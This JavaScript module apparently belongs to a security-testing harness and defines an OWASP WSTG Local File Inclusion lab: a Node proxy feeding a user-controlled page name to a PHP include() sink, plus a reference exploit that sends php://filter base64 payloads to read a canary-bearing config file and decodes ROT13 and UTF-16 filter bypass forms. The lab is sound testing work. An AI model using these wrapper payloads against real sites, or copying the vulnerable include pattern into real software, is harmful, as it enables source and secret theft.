// WSTG-INPV-11.1 (4.7.11.1) — Local File Inclusion behaviour.
// Node front proxies a page-include request to a real PHP backend whose include()
// sink takes the user-controlled page name. The canary is written into a PHP
// config file, so plain inclusion executes it (no output); the attacker uses the
// php://filter wrapper to base64-exfiltrate the source.

import { Scenario } from './scenario.mjs'

const CONFIG_PATH = '/tmp/app-config.php' // must match backends/lfi.php
const B = 'classes/wstg-lfi-4.7.11.1/backends'

export const classDef = {
  wstgId: 'WSTG-INPV-11.1',
  class: 'Local File Inclusion',
  defenceTiers: [0, 1],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  // Real PHP backend with the include() sink; canary injected into its env.
  backend: {
    spec({ scenario, manifest }) {
      return {
        cmd: 'php',
        args: ['-S', '127.0.0.1:9001', `${B}/lfi.php`],
        port: 9001,
        env: {
          PR_BACKEND_PORT: '9001',
          PR_PAGE_PARAM: scenario.pageParam,
          PR_CANARY: manifest.perDeployCanary,
        },
      }
    },
  },

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path
  },

  async handleRequest({ req, reqUrl, scenario, helpers, renderPage }) {
    // No page selected → host page (with the config-path hint).
    if (reqUrl.searchParams.get(scenario.pageParam) == null) {
      return { status: 200, body: renderPage(hostPage(scenario)) }
    }
    // Proxy the include to the real PHP backend and render its output.
    const r = await helpers.proxyToBackend(req, reqUrl)
    return { status: 200, body: renderPage(`<section style="max-width:680px;margin:0 auto">${r.body}</section>`) }
  },

  // Reference exploit. Fires the supplied wrapper payload through the include
  // parameter; the validator passes canonicalPayload at T0/T1 canonical and
  // each bypass template when iterating after a block. Honouring the payload
  // arg is what allows the T1 bypass list to actually iterate alternative
  // wrapper forms against the WAF.
  async fireExploit({ baseUrl, scenario, payload }) {
    const wrapper = (typeof payload === 'string' && payload.length > 0 && /:\/\//.test(payload))
      ? payload
      : `php://filter/convert.base64-encode/resource=${CONFIG_PATH}`
    const url = `${baseUrl}${scenario.endpoint.path}?${encodeURIComponent(scenario.pageParam)}=${encodeURIComponent(wrapper)}`
    const r = await fetch(url, { redirect: 'manual' })
    // Fetch as bytes so iconv UTF-16 output survives transport unmodified.
    const buf = Buffer.from(await r.arrayBuffer())
    const text = buf.toString('utf8')
    // The wrapper bypasses output the config source in transformed forms; try
    // each transform locally so the success substring check sees the canary.
    const candidates = [text]
    // base64-decode any sufficiently long base64 blob (canonical filter form).
    for (const m of text.match(/[A-Za-z0-9+/]{40,}={0,2}/g) || []) {
      try { candidates.push(Buffer.from(m, 'base64').toString('utf8')) } catch {}
    }
    // ROT13-decode (string.rot13 filter bypass).
    candidates.push(text.replace(/[a-zA-Z]/g, c => {
      const base = c <= 'Z' ? 65 : 97
      return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base)
    }))
    // UTF-16LE/BE decode (convert.iconv.* filter bypass).
    try { candidates.push(buf.toString('utf16le')) } catch {}
    try {
      const swapped = Buffer.alloc(buf.length)
      for (let i = 0; i + 1 < buf.length; i += 2) { swapped[i] = buf[i + 1]; swapped[i + 1] = buf[i] }
      candidates.push(swapped.toString('utf16le'))
    } catch {}
    return { status: r.status, body: candidates.join('\n<!--decoded-->\n') }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

function hostPage(scenario) {
  const link = (p, label) => `<a href="${scenario.endpoint.path}?${encodeURIComponent(scenario.pageParam)}=${p}">${label}</a>`
  return `<section style="max-width:680px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 8px">${escapeHtml(scenario.featureLabel)}</h2>
  <p style="color:#666;margin:0 0 12px">${escapeHtml(scenario.intro)}</p>
  <nav style="display:flex;gap:14px;margin-bottom:12px">${link('home', 'Home')} · ${link('about', 'About')} · ${link('pricing', 'Pricing')}</nav>
  <p style="font-size:13px;color:#666">Pages are rendered dynamically via the <code>${escapeHtml(scenario.pageParam)}</code> parameter. Site configuration loads from the server-side PHP config at <code>${CONFIG_PATH}</code>.</p>
</section>`
}
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
